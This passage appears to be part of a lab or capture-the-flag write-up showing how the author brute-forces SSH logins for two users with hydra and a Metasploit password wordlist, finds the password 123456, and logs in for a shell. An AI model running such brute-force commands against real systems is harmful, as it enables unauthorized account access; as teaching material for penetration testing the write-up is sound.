# Other access methods

To learn more about how the system works, and possibly other vectors of exploits, I decided to further explore the web application.

### Brute forcing SSH password

As we have seen previously, there are 2 users that stands out in the `/etc/passwd` file: _joshua_ and _charles_. I attempted a password brute force attack on their SSH login with the wordlist from Metasploit `/usr/share/wordlists/metasploit/unix_passwords.txt` :

{% code overflow="wrap" %}
```sh
$ hydra -l joshua -P <wordlist> -t 6 ssh://<host>
$ hydra -l charles -P <wordlist> -t 6 ssh://<host>
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I found the password _**123456**_ for both usernames `joshua` and `charles`. We can now SSH with the usernames and gain a remote shell:

```sh
$ ssh <user>@<host>
```

